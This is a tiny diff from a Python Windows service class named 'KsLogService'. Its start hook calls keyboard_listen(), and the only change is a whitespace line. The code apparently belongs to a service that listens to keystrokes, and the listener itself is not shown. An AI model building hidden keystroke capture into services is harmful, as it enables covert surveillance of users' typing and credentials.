@@ -49,6 +49,7 @@ class KsLogService(win32serviceutil.ServiceFramework):
         Override to add logic before the start
         eg. running condition
         '''
+        
         keyboard_listen()
         print('hello')
         pass
